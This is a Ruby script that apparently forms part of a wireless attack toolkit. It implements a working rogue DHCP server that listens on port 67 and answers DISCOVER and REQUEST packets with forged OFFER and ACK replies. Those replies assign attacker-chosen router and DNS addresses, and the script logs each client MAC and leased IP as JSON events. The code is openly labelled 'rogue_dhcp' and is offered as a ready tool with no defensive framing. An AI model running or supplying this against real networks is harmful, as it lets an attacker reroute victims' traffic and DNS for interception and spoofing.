#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'socket'

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

BOOTP_REQUEST = 1
BOOTP_REPLY = 2

DHCP_DISCOVER = 1
DHCP_OFFER = 2
DHCP_REQUEST = 3
DHCP_DECLINE = 4
DHCP_ACK = 5
DHCP_NAK = 6
DHCP_RELEASE = 7

DHCP_MESSAGE_TYPE_OPTION = 53
DHCP_SERVER_IDENTIFIER = 54
DHCP_LEASE_TIME = 51
DHCP_SUBNET_MASK = 1
DHCP_ROUTER = 3
DHCP_DNS_SERVER = 6
DHCP_DOMAIN_NAME = 15
DHCP_REQUESTED_IP = 50

def build_dhcp_offer(trans_id, client_mac, offered_ip, server_ip, subnet, router, dns, lease_time)
  op = [BOOTP_REPLY].pack('C')
  htype = [1].pack('C')
  hlen = [6].pack('C')
  hops = [0].pack('C')
  xid = [trans_id].pack('N')
  secs = [0].pack('n')
  flags = [0].pack('n')
  ciaddr = [0, 0, 0, 0].pack('C4')
  yiaddr = offered_ip.split('.').map(&:to_i).pack('C4')
  siaddr = [0, 0, 0, 0].pack('C4')
  giaddr = [0, 0, 0, 0].pack('C4')
  chaddr = client_mac + "\x00" * 10
  sname = "\x00" * 64
  file = "\x00" * 128
  magic = [0x63, 0x82, 0x53, 0x63].pack('C*')

  options = +''
  options << [DHCP_MESSAGE_TYPE_OPTION, 1, DHCP_OFFER].pack('CCC')
  options << [DHCP_SERVER_IDENTIFIER, 4].pack('CC') + server_ip.split('.').map(&:to_i).pack('C4')
  options << [DHCP_SUBNET_MASK, 4].pack('CC') + subnet.split('.').map(&:to_i).pack('C4')
  options << [DHCP_ROUTER, 4].pack('CC') + router.split('.').map(&:to_i).pack('C4')
  options << [DHCP_DNS_SERVER, 4].pack('CC') + dns.split('.').map(&:to_i).pack('C4')
  options << [DHCP_LEASE_TIME, 4].pack('CC') + [lease_time].pack('N')
  options << [0xFF].pack('C')

  op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file + magic + options
end

def build_dhcp_ack(trans_id, client_mac, offered_ip, server_ip, subnet, router, dns, lease_time)
  op = [BOOTP_REPLY].pack('C')
  htype = [1].pack('C')
  hlen = [6].pack('C')
  hops = [0].pack('C')
  xid = [trans_id].pack('N')
  secs = [0].pack('n')
  flags = [0].pack('n')
  ciaddr = [0, 0, 0, 0].pack('C4')
  yiaddr = offered_ip.split('.').map(&:to_i).pack('C4')
  siaddr = [0, 0, 0, 0].pack('C4')
  giaddr = [0, 0, 0, 0].pack('C4')
  chaddr = client_mac + "\x00" * 10
  sname = "\x00" * 64
  file = "\x00" * 128
  magic = [0x63, 0x82, 0x53, 0x63].pack('C*')

  options = +''
  options << [DHCP_MESSAGE_TYPE_OPTION, 1, DHCP_ACK].pack('CCC')
  options << [DHCP_SERVER_IDENTIFIER, 4].pack('CC') + server_ip.split('.').map(&:to_i).pack('C4')
  options << [DHCP_SUBNET_MASK, 4].pack('CC') + subnet.split('.').map(&:to_i).pack('C4')
  options << [DHCP_ROUTER, 4].pack('CC') + router.split('.').map(&:to_i).pack('C4')
  options << [DHCP_DNS_SERVER, 4].pack('CC') + dns.split('.').map(&:to_i).pack('C4')
  options << [DHCP_LEASE_TIME, 4].pack('CC') + [lease_time].pack('N')
  options << [0xFF].pack('C')

  op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file + magic + options
end

def parse_dhcp(data)
  return nil if data.size < 240
  op = data[0].ord
  htype = data[1].ord
  hlen = data[2].ord
  xid = data[4..7].unpack1('N')
  client_mac = data[28..33]
  return nil unless client_mac && client_mac.size == 6

  magic = data[236..239]
  return nil unless magic == "\x63\x82\x53\x63"

  options = data[240..]
  return nil unless options

  dhcp_type = nil
  requested_ip = nil
  pos = 0
  while pos < options.size
    opt = options[pos].ord
    break if opt == 0xFF
    next_pos = pos + 1
    break if next_pos >= options.size
    opt_len = options[next_pos].ord
    break if pos + 2 + opt_len > options.size
    opt_val = options[pos + 2, opt_len]
    case opt
    when DHCP_MESSAGE_TYPE_OPTION then dhcp_type = opt_val.unpack1('C') if opt_len >= 1
    when DHCP_REQUESTED_IP then requested_ip = opt_val.unpack('C4').join('.') if opt_len >= 4
    end
    pos += 2 + opt_len
  end

  { op: op, xid: xid, client_mac: client_mac, dhcp_type: dhcp_type, requested_ip: requested_ip }
end

begin
  iface = ARGV[0]
  subnet = ARGV[1] || '192.168.100.0'
  router = ARGV[2] || '192.168.100.1'
  dns = ARGV[3] || '8.8.8.8'

  raise 'interface required' unless iface

  subnet_prefix = subnet.sub(/\.0$/, '')
  server_ip = "#{subnet_prefix}.1"
  lease_time = 43200

  sock = Socket.new(Socket::AF_INET, Socket::SOCK_DGRAM, 0)
  sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, 1)
  sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_BROADCAST, 1)

  sock.bind(Socket.pack_sockaddr_in(67, '0.0.0.0'))

  emit('rogue_dhcp_start', iface, '', '', 0, { subnet: subnet, router: router, dns: dns, server_ip: server_ip })

  offered_ips = {}
  ip_counter = 10

  loop do
    data, addr = sock.recvfrom(1024)
    client_port, client_ip = Socket.unpack_sockaddr_in(addr)

    dhcp = parse_dhcp(data)
    next unless dhcp

    client_mac_str = dhcp[:client_mac].unpack('H2H2H2H2H2H2').join(':')

    emit('dhcp_packet', iface, '', '', 0, {
      client_mac: client_mac_str, dhcp_type: dhcp[:dhcp_type], xid: dhcp[:xid],
      requested_ip: dhcp[:requested_ip], source_ip: client_ip
    })

    case dhcp[:dhcp_type]
    when DHCP_DISCOVER
      offered_ip = dhcp[:requested_ip] || "#{subnet_prefix}.#{ip_counter}"
      ip_counter += 1

      unless offered_ips[client_mac_str]
        offered_ips[client_mac_str] = { offered: offered_ip, state: 'offer', count: 0 }
      end
      offered_ips[client_mac_str][:count] += 1

      offer = build_dhcp_offer(dhcp[:xid], dhcp[:client_mac], offered_ip, server_ip, subnet, router, dns, lease_time)
      sock.send(offer, 0, Socket.pack_sockaddr_in(68, client_ip.empty? ? '255.255.255.255' : client_ip))

      emit('dhcp_offer_sent', iface, '', '', 0, {
        client_mac: client_mac_str, offered_ip: offered_ip, xid: dhcp[:xid]
      })

    when DHCP_REQUEST
      req_ip = dhcp[:requested_ip] || "#{subnet_prefix}.#{ip_counter - 1}"

      ack = build_dhcp_ack(dhcp[:xid], dhcp[:client_mac], req_ip, server_ip, subnet, router, dns, lease_time)
      sock.send(ack, 0, Socket.pack_sockaddr_in(68, client_ip.empty? ? '255.255.255.255' : client_ip))

      offered_ips[client_mac_str] = { offered: req_ip, state: 'acked', count: (offered_ips[client_mac_str] || { count: 0 })[:count] + 1 }

      emit('dhcp_ack_sent', iface, '', '', 0, {
        client_mac: client_mac_str, assigned_ip: req_ip, xid: dhcp[:xid]
      })
    end
  end

  sock.close

rescue Interrupt
  emit('rogue_dhcp_interrupted', iface || '', '', '', 0, { leases: offered_ips&.size || 0 })
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
